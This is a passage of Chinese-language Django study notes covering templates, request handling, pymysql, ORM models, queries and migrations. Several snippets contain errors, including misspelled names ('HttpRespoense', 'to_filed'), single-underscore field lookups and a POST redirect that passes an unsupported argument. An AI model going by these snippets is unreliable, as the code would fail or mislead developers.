n2的值是&#123;&#123;n2&#125;&#125; <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--列表取值--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span> n2的第1个值是&#123;&#123;n2.0&#125;&#125; <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span> n2的第2个值是&#123;&#123;n2.1&#125;&#125; <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span> n2的第3个值是&#123;&#123;n2.2&#125;&#125; <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--字典取值--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span> n3的第name个值是&#123;&#123;n3.name&#125;&#125; <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span> n3的第height个值是&#123;&#123;n3.height&#125;&#125; <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span> n3的第weight个值是&#123;&#123;n3.weight&#125;&#125; <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    n1 = <span class="string">&quot;Hello World&quot;</span></span><br><span class="line">    n2 = [<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;user&quot;</span>,<span class="string">&quot;people&quot;</span>]</span><br><span class="line">    n3 = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Tsumugi&quot;</span>,<span class="string">&quot;height&quot;</span>:<span class="number">152</span>,<span class="string">&quot;weight&quot;</span>:<span class="number">38</span>&#125;</span><br><span class="line">    params = &#123;<span class="string">&quot;n1&quot;</span>: n1, <span class="string">&quot;n2&quot;</span>: n2, <span class="string">&quot;n3&quot;</span>: n3&#125;</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&quot;index.html&quot;</span>, params)</span><br></pre></td></tr></table></figure><h3 id="2-判断"><a href="#2-判断" class="headerlink" title="2 判断"></a>2 判断</h3><blockquote><p>一个块内可以写多行语句。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> n3.name == <span class="string">&quot;Tsumugi&quot;</span> %&#125;</span><br><span class="line">&lt;span&gt;Tsumugi&lt;/span&gt;</span><br><span class="line">    &lt;span&gt;Tsumugi&lt;/span&gt;</span><br><span class="line">&#123;% <span class="keyword">elif</span> n3.height == <span class="number">160</span> %&#125;</span><br><span class="line">&lt;span&gt;Height <span class="keyword">is</span> <span class="number">160</span>&lt;/span&gt;</span><br><span class="line">&#123;% <span class="keyword">else</span> %&#125;</span><br><span class="line">&lt;span&gt;other&lt;/span&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h3 id="3-循环"><a href="#3-循环" class="headerlink" title="3 循环"></a>3 循环</h3><blockquote><p>Django不支持enumerate函数。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 依次获得列表值（forloop.counter表示当前循环的数是第几个（从1开始））</span></span><br><span class="line">&#123;% <span class="keyword">for</span> val <span class="keyword">in</span> n2 %&#125;</span><br><span class="line">&lt;span&gt;n2的第&#123;&#123; forloop.counter &#125;&#125;个值是&#123;&#123; val &#125;&#125;&lt;br /&gt;&lt;/span&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 依次获得键、值、键值（都不加括号）</span></span><br><span class="line">&#123;% <span class="keyword">for</span> k <span class="keyword">in</span> n3.keys %&#125;</span><br><span class="line">&lt;span&gt;keys <span class="keyword">is</span> &#123;&#123;k&#125;&#125;&lt;/span&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">for</span> v <span class="keyword">in</span> n3.values %&#125;</span><br><span class="line">&lt;span&gt;values <span class="keyword">is</span> &#123;&#123;v&#125;&#125;&lt;/span&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">for</span> k,v <span class="keyword">in</span> n3.items %&#125;</span><br><span class="line">&lt;li&gt;n3的&#123;&#123;k&#125;&#125;是&#123;&#123;v&#125;&#125;&lt;/li&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h3 id="4-获取用户参数"><a href="#4-获取用户参数" class="headerlink" title="4 获取用户参数"></a>4 获取用户参数</h3><blockquote><p>对views函数中的request进行操作。</p><p>request是一个对象，封装了用户发送过来的所有数据。</p><p>重定向模式：类似DNS的迭代查询，返回网址让浏览器去查询，而不是服务器自己去查询。（可以节约性能）</p><p>403 Forbidden：Django自带CSRF漏洞防护，若不带token会报403。所以只需要再form后面加上<code>&#123;% csrf_token %&#125;</code>带上CSRF的token即可解决该问题。</p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--带上CSRF的token--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;after_login.html&quot;</span>&gt;</span></span><br><span class="line">    &#123;% csrf_token %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;username&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pwd&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;password&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义带有request参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment"># 返回内容</span></span><br><span class="line">    <span class="keyword">return</span> HttpRespoense(<span class="string">&quot;Content&quot;</span>)</span><br><span class="line">    <span class="comment"># 返回HTML渲染后的结果</span></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&quot;index.html&quot;</span>)</span><br><span class="line">    <span class="comment"># 重定向（要导入redirect）</span></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.获取请求方式</span></span><br><span class="line">request.method</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.获取请求值（返回字典）</span></span><br><span class="line">QueryDict = request.GET</span><br><span class="line">QueryDict = request.POST</span><br><span class="line"><span class="comment"># 获得数据（存在获得，不存在返回空）</span></span><br><span class="line">username = request.POST.get(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Get重定向</span></span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> redirect</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> QueryDict</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_view</span>(<span class="params">request</span>):</span><br><span class="line">    params = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">25</span>&#125;</span><br><span class="line">    query_string = QueryDict(<span class="string">&#x27;&#x27;</span>, mutable=<span class="literal">True</span>)</span><br><span class="line">    query_string.update(params)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/new-url/?&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(query_string.urlencode()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Post重定向</span></span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> redirect</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> QueryDict</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_view</span>(<span class="params">request</span>):</span><br><span class="line">    params = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">25</span>&#125;</span><br><span class="line">    query_string = QueryDict(<span class="string">&#x27;&#x27;</span>, mutable=<span class="literal">True</span>)</span><br><span class="line">    query_string.update(params)</span><br><span class="line"></span><br><span class="line">    redirect_url = <span class="string">&#x27;/new-url/&#x27;</span></span><br><span class="line">    redirect_request = request.POST.copy()  <span class="comment"># 复制原始POST请求数据</span></span><br><span class="line">    redirect_request.update(query_string)  <span class="comment"># 将参数和POST请求数据合并</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(redirect_url, request=redirect_request)</span><br></pre></td></tr></table></figure><h3 id="5-pymysql"><a href="#5-pymysql" class="headerlink" title="5 pymysql"></a>5 pymysql</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建数据库</span></span><br><span class="line"><span class="keyword">create</span> database db <span class="keyword">DEFAULT</span> CHARSET utf8 <span class="keyword">COLLATE</span> utf8_general_ci;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.连接MysQL</span></span><br><span class="line">conn = pymysql.connect ( host=<span class="string">&quot;127.0.0.1&quot;</span>,port = <span class="number">3306</span>,user = <span class="string">&#x27;root&#x27;</span>，passwd = <span class="string">&quot;root123&quot;</span>, charset = <span class="string">&#x27;utf8 &#x27;</span>, db = <span class="string">&#x27;unicom&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.设置游标</span></span><br><span class="line">cursor = conn.cursor (cursor = pymysql.cursors.DictCursor)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.操作数据库</span></span><br><span class="line">cursor.execute( <span class="string">&quot;insert into admin (username,password,mobile) values ( &#x27;admin&#x27; , &#x27;123456&#x27;,&#x27;11011101110&#x27;)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.提交数据</span></span><br><span class="line">conn.commit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.操作数据库数据</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.关闭</span></span><br><span class="line">cursor.close()</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><h3 id="6-ORM框架"><a href="#6-ORM框架" class="headerlink" title="6 ORM框架"></a>6 ORM框架</h3><blockquote><p>因为通过pymysql操作数据库还是太繁琐了，于是Django直接集成了一个ORM框架。底层可以是任意的数据库，类似于PHP的PDO。</p><p>代码都是写在models.py中。</p><p>使用前要：<code>pip install mysqlclient</code></p><p>ORM可以做的事：</p><ul><li>创建、修改、删除数据库中的表。（不用写SQL）</li><li>操作表中的数据。（不用写SQL）</li></ul><p>ORM不可以做的事：</p><ul><li>创建数据库。</li></ul></blockquote><p>设置数据库</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建</span></span><br><span class="line"><span class="comment"># 创建字符型（一定要带最大长度）</span></span><br><span class="line">models.CharField(max_length = <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建整形</span></span><br><span class="line">models.IntegerField()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建小数（总长度10，小数位2）</span></span><br><span class="line">models.DecimalField(max_digits = <span class="number">10</span>, decimal_places = <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建时间类型</span></span><br><span class="line">models.DateTimeField() <span class="comment"># 年月日时分秒</span></span><br><span class="line">models.DateField() <span class="comment"># 年月日</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建自动增加类型</span></span><br><span class="line">models.BigAutoField(primary_key = <span class="literal">True</span>) <span class="comment"># bigint</span></span><br><span class="line">models.AutoField(primary_key = <span class="literal">True</span>) <span class="comment"># int</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通用参数</span></span><br><span class="line"><span class="comment"># 备注名称</span></span><br><span class="line">models.IntegerField(verbose_name = <span class="string">&#x27;用户名&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置默认值</span></span><br><span class="line">models.IntegerField(default = <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置可以为空（null：可以是空值、blank：可以无值）</span></span><br><span class="line">models.IntegerField(null = <span class="literal">True</span>, blank = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置主键</span></span><br><span class="line">models.IntegerField(primary_key = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置外键（to：关联的表、to_field：关联的列、on_delete：别的表主键被删除后做的处理）</span></span><br><span class="line"><span class="comment"># 注：此处Django会将列名自动改成user_id而非user。</span></span><br><span class="line"><span class="comment"># on_delete参数：models.CASCADE（级联删除，直接删除对应行的数据）、models.SET_NULL（为空，需要设置可以为空）</span></span><br><span class="line">user = models.ForeignKey(to = <span class="string">&quot;userTable&quot;</span>, to_filed = <span class="string">&quot;id&quot;</span>,on_delete = models.CASCADE)</span><br><span class="line">user = models.ForeignKey(to = <span class="string">&quot;userTable&quot;</span>, to_filed = <span class="string">&quot;id&quot;</span>, null = <span class="literal">True</span>, blank = <span class="literal">True</span>, on_delete = models.SET_NULL)</span><br><span class="line"><span class="comment"># 若字段设置了外键，在views.py中可以通过&quot;字段.外表字段&quot;让Django自动联表获得属性。只是获得外键值则是&quot;字段_id&quot;</span></span><br><span class="line">queryset = models.UserInfo.objects.<span class="built_in">all</span>()</span><br><span class="line"><span class="keyword">for</span> obj <span class="keyword">in</span> queryset:</span><br><span class="line">    obj.depart_id <span class="comment"># 获取数据库中存储的那个字段值</span></span><br><span class="line">    obj.deaprt.title <span class="comment"># 根据id自动去关联的表中获取那一行数据depart对象。</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 在Django中做的约束</span></span><br><span class="line">gender_choices = ((<span class="number">1</span>, <span class="string">&quot;男&quot;</span>),(<span class="number">2</span>, <span class="string">&quot;女&quot;</span>))</span><br><span class="line">gender = models.SmallIntegerField(verbose_name = <span class="string">&quot;性别&quot;</span>, choices = gender_choices)</span><br><span class="line"><span class="comment"># 若一个字段有choices属性，在views.py中可以通过&quot;get_字段名称_display()&quot;让Django自动转化值</span></span><br><span class="line">queryset = models.UserInfo.objects.<span class="built_in">all</span>()</span><br><span class="line"><span class="keyword">for</span> obj <span class="keyword">in</span> queryset:</span><br><span class="line">    obj.gender <span class="comment"># 1/2</span></span><br><span class="line">    obj.get_gender_display() <span class="comment"># 男/女</span></span><br></pre></td></tr></table></figure><p>数据操作</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建表（类一定要继承models.Model）</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserInfo</span>(models.Model):</span><br><span class="line">    name = models.CharField(max_length = <span class="number">32</span>)</span><br><span class="line">    user = models.ForeignKey(to = <span class="string">&quot;userTable&quot;</span>, to_filed = <span class="string">&quot;id&quot;</span>,on_delete = models.CASCADE)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">上述语句会通过Django自动翻译成下列sql</span></span><br><span class="line"><span class="string">表名是app名字 + 下划线 + 类名</span></span><br><span class="line"><span class="string">id是自动加上的且是自增和主键（设置了主键则不会有id）</span></span><br><span class="line"><span class="string">create table appName_userinfo</span></span><br><span class="line"><span class="string">(</span></span><br><span class="line"><span class="string">id bigint auto_increment primary key,</span></span><br><span class="line"><span class="string">name varchar(32),</span></span><br><span class="line"><span class="string">password varchar(64),</span></span><br><span class="line"><span class="string">age int</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除表字段（直接注释或修改，然后用命令迁移）</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserInfo</span>(models.Model):</span><br><span class="line">    name = models.CharField(max_length = <span class="number">32</span>)</span><br><span class="line">    password = models.CharField(max_length = <span class="number">64</span>)</span><br><span class="line">    <span class="comment"># age = models.IntegerField()</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 增加表字段（不能直接增加，使用makemigrations命令后会给出两个选项）</span></span><br><span class="line"><span class="comment"># 1.直接给一个默认值</span></span><br><span class="line"><span class="comment"># 2.退出，在新加字段后面加上默认值或空值。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserInfo</span>(models.Model):</span><br><span class="line">    name = models.CharField(max_length = <span class="number">32</span>)</span><br><span class="line">    password = models.CharField(max_length = <span class="number">64</span>)</span><br><span class="line">    <span class="comment"># age = models.IntegerField()</span></span><br><span class="line">    size = models.IntegerField(default = <span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 添加数据：&lt;class&gt;.objects.create(&lt;table_name&gt;=value[,&lt;table_name&gt;=value...])</span></span><br><span class="line"><span class="comment"># 内部会自己转化成insert的sql语句</span></span><br><span class="line">UserInfo.objects.create(name = <span class="string">&quot;tsumugi&quot;</span>, password = <span class="string">&quot;123456&quot;</span>, size = <span class="string">&quot;36&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除数据</span></span><br><span class="line">UserInfo.objects.<span class="built_in">filter</span>(<span class="built_in">id</span> = <span class="number">3</span>).delete() <span class="comment"># 选择</span></span><br><span class="line">UserInfo.objects.<span class="built_in">all</span>().delete() <span class="comment"># 全部</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新数据</span></span><br><span class="line">UserInfo.objects.<span class="built_in">filter</span>(<span class="built_in">id</span> = <span class="number">2</span>).update(password = <span class="string">&quot;999&quot;</span>) <span class="comment"># 选择</span></span><br><span class="line">UserInfo.objects.<span class="built_in">all</span>().update(password = <span class="string">&quot;999&quot;</span>) <span class="comment"># 全部</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据</span></span><br><span class="line">data_list = UserInfo.objects.<span class="built_in">filter</span>(<span class="built_in">id</span> = <span class="number">1</span>) <span class="comment"># 选择</span></span><br><span class="line">data_list = UserInfo.objects.<span class="built_in">all</span>() <span class="comment"># 全部</span></span><br><span class="line">row_list = UserInfo.objects.<span class="built_in">filter</span>(<span class="built_in">id</span> = <span class="number">1</span>).first() <span class="comment"># 获取第一条数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取每一行数据（用点访问）</span></span><br><span class="line"><span class="keyword">for</span> obj <span class="keyword">in</span> data_list:</span><br><span class="line">    <span class="built_in">print</span>(obj.<span class="built_in">id</span>, obj.name, obj.password)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 数据排序</span></span><br><span class="line">queryset = models.UserInfo.objects.<span class="built_in">all</span>().order_by(<span class="string">&quot;name&quot;</span>) <span class="comment"># 升序</span></span><br><span class="line">queryset = models.UserInfo.objects.<span class="built_in">all</span>().order_by(<span class="string">&quot;-name&quot;</span>) <span class="comment"># 降序</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据是否存在</span></span><br><span class="line">exists = models.UserInfo.objects.<span class="built_in">filter</span>(mobile=mobile).exists()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 排除某个值</span></span><br><span class="line">queryset = models.UserInfo.objects.exclude(<span class="built_in">id</span>=<span class="built_in">id</span>).<span class="built_in">filter</span>(mobile=mobile)</span><br></pre></td></tr></table></figure><p>筛选数据</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 筛选数据</span></span><br><span class="line"><span class="comment"># 方法一：直接赋值</span></span><br><span class="line">UserInfo.objects.<span class="built_in">filter</span>(mobile=<span class="string">&quot;11111111111&quot;</span>,<span class="built_in">id</span>=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 方法二：字典解包</span></span><br><span class="line">data_dict = &#123;<span class="string">&quot;mobile&quot;</span>:<span class="string">&quot;11111111111&quot;</span>, <span class="string">&quot;id&quot;</span>:<span class="number">1</span>&#125;</span><br><span class="line">UserInfo.objects.<span class="built_in">filter</span>(**data_dict)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Django自带数据判断的函数参数（通过：字段__条件 = value设置）</span></span><br><span class="line"><span class="comment"># 数字条件</span></span><br><span class="line">UserInfo.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=<span class="number">12</span>) <span class="comment"># 等于12</span></span><br><span class="line">UserInfo.objects.<span class="built_in">filter</span>(id_gt=<span class="number">12</span>) <span class="comment"># 大于12</span></span><br><span class="line">UserInfo.objects.<span class="built_in">filter</span>(id_gte=<span class="number">12</span>) <span class="comment"># 大于等于12</span></span><br><span class="line">UserInfo.objects.<span class="built_in">filter</span>(id_lt=<span class="number">12</span>) <span class="comment"># 小于12</span></span><br><span class="line">UserInfo.objects.<span class="built_in">filter</span>(id_lte=<span class="number">12</span>) <span class="comment"># 小于等于12</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串条件</span></span><br><span class="line">UserInfo.objects.<span class="built_in">filter</span>(mobile_startswith=<span class="string">&quot;1999&quot;</span>) <span class="comment"># 以1999开头</span></span><br><span class="line">UserInfo.objects.<span class="built_in">filter</span>(mobile_endswith=<span class="string">&quot;999&quot;</span>) <span class="comment"># 以999结尾</span></span><br><span class="line">UserInfo.objects.<span class="built_in">filter</span>(mobile_contains=<span class="string">&quot;995&quot;</span>) <span class="comment"># 包含995</span></span><br></pre></td></tr></table></figure><p>数据库命令</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用下列两个命令完成表的迁移</span></span><br><span class="line"><span class="comment"># 创建数据库迁移文件，自动检测models.py文件中的更改</span></span><br><span class="line">python manage.py makemigrations</span><br><span class="line"><span class="comment"># 执行数据库迁移（首次迁移会迁移多个表，是系统自带的，可以在setting的INSTALLED_APPS中修改）</span></span><br><span class="line">python manage.py migrate</span><br></pre></td></tr></table></figure><h3 id="7-模版数据处理"><a href="#7-模版数据处理" class="headerlink" title="7 模版数据处理"></a>7 模版数据处理</h3><blockquote><p>模版内使用函数不要带括号。</p><p>模版内不能使用带参数的函数。</p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">th</span>&gt;</span>&#123;&#123; obj.id &#125;&#125;<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; obj.name &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; obj.account &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 时间处理不能用函数，用管道符和Django内置函数 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; obj.create_time|date: &quot;Y-m-d H:i:s&quot; &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 函数不要加括号，需要时Django会自己加 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; obj.get_gender_display &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; obj.deaprt.title H<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="三、文件设计"><a href="#三、文件设计" class="headerlink" title="三、文件设计"></a>三、文件设计</h2><h3 id="1-模板继承"><a href="#1-模板继承" class="headerlink" title="1 模板继承"></a>1 模板继承</h3><blockquote><p>在父html中写上<code>&#123;% block ... %&#125;&#123;% endblock %&#125;</code>，然后在子页面中先<code>&#123;% extends 'father.html' %&#125;</code>引入父页面，再重写<code>&#123;% block ... %&#125;&#123;% endblock %&#125;</code>完成子页面的独立设计。</p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 父html：写上block块让子html继承--&gt;</span></span><br><span class="line">&#123;% load static %&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;% static &#x27;css/main.css&#x27; %&#125;&quot;</span>&gt;</span></span><br><span class="line">        &#123;% block css %&#125;</span><br><span class="line">        &#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">            &#123;% block content %&#125;</span><br><span class="line">            &#123;% endblock %&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;&#123;% static &#x27;js/main.js&#x27; %&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        &#123;% block js %&#125;</span><br><span class="line">        &#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 子html：先引入父html，再书写block即可--&gt;</span></span><br><span class="line">&#123;% extends &#x27;father.html&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block css %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;% static &#x27;css/other.css&#x27; %&#125;&quot;</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endblock%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block js %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;&#123;% static &#x27;js/other.js&#x27; %&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><h3 id="2-获得数据库固定数据"><a href="#2-获得数据库固定数据" class="headerlink" title="2 获得数据库固定数据"></a>2 获得数据库固定数据</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># urls.py</span></span><br><span class="line">urlpatterns = [</span><br><span class="line">     path(<span class="string">&#x27;userAdd.html&#x27;</span>, view.user_add)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># models.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserInfo</span>(models.Model):</span><br><span class="line">    name = models.CharField(max_length = <span class="number">32</span>)</span><br><span class="line">    gender_choices = ((<span class="number">1</span>, <span class="string">&quot;男&quot;</span>),(<span class="number">2</span>, <span class="string">&quot;女&quot;</span>))</span><br><span class="line">gender = models.SmallIntegerField(verbose_name = <span class="string">&quot;性别&quot;</span>, choices = gender_choices)</span><br><span class="line">    depart = models.ForeignKey(to = <span class="string">&quot;Department&quot;</span>, to_filed = <span class="string">&quot;id&quot;</span>,on_delete = models.CASCADE)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Department</span>(models.Model):</span><br><span 